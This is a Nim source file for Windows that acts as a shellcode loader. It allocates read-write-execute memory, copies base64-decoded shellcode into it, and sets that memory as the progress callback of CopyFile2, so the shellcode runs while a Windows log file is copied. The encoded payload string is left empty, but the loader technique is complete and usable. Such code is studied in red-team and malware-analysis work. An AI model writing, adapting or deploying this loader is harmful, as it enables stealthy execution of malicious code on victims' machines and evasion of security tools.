import base64

import winim
import winim/lean

proc copyFile2[byte](shellcode: openArray[byte]): void =

  let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))

  let params = create(COPYFILE2_EXTENDED_PARAMETERS)
  let cancel = cast[WINBOOL](TRUE)
  params.dwSize = cast[DWORD](sizeof(params))
  params.dwCopyFlags = COPY_FILE_FAIL_IF_EXISTS
  params.pfCancel = unsafeAddr cancel
  params.pProgressRoutine = cast[PCOPYFILE2_PROGRESS_ROUTINE](rPtr)
  params.pvCallbackContext = NULL

  DeleteFileW(newWideCString(r"C:\\Windows\\Temp\\backup.log"))
  CopyFile2(newWideCString(r"C:\\Windows\\WindowsUpdate.log"), newWideCString(r"C:\\Windows\\Temp\\backup.log"), params)

when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = ""

  let shellcode = toByteSeq(decode(enc))
  copyFile2(shellcode)
